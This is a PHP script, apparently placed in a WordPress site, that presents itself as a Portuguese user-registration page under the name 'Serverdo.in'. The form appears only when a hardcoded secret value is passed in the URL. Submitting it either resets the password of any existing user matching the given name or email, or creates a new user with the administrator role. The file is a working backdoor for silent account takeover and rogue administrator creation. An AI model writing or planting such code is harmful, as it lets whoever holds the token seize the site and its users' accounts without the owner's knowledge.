<?php
if($_GET['auth'] == 'asdfghjkl'):

session_start();
$session = time();
$_SESSION['code'] = $session;
$url_atual = 'https://' . $_SERVER['HTTP_HOST'] .'/passwp.php';

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cadastro de Usuário</title>
    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style> 
    body{
        background-color: #F3782A;
        color: #fff;
    }
    .btn-primary {
    color: #fff;
    background-color: #3276b1;
    border-color: #3276b1;
    font-weight: bold;
    }
    h2,h1{
        text-align: center;
    }

    </style>
</head>
<body>
    <div class="container mt-5">
        <div class="row justify-content-center">
            <div class="col-md-6">
                <h1>Serverdo.in</h1>
                <h2>Cadastro de Usuário</h2>
                <form action="<?php echo $url_atual ?>" method="POST">
                    <input type="hidden" name="code" value="<?php echo $session ?>" />
                    <div class="form-group">
                        <label for="username">Nome de Usuário:</label>
                        <input type="text" class="form-control" id="username" name="username" required>
                    </div>
                    <div class="form-group">
                        <label for="email">E-mail:</label>
                        <input type="email" class="form-control" id="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label for="password">Senha:</label>
                        <input type="password" class="form-control" id="password" name="password" required>
                    </div>
                    <button type="submit" class="btn btn-primary">Cadastrar</button>
                </form>
            </div>
        </div>
    </div>
</body>
</html>
<?php endif; ?>

<?php

if(!empty($_POST) && $_POST['code'] == $_SESSION['code'] ) {
        // Caminho absoluto para o arquivo wp-load.php
        require_once('./wp-load.php');

        // Informações do novo usuário
        $username = $_POST['username'];
        $email = $_POST['email'];
        $password = $_POST['password'];

        // Verifica se o usuário já existe
        if (username_exists($username) || email_exists($email)) {
                // Altera a senha se o usuário já existe
                $user_id = username_exists($username) ?: email_exists($email);
                wp_set_password($password, $user_id);
                echo "Senha alterada com sucesso.";
                exit;
        }

        // Cria o novo usuário
        $user_id = wp_create_user($username, $password, $email);

        if (is_wp_error($user_id)) {
            echo "Erro ao criar usuário: " . $user_id->get_error_message();
            exit;
        }

        // Define o novo usuário como administrador
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        echo "Usuário administrador criado com sucesso.";

}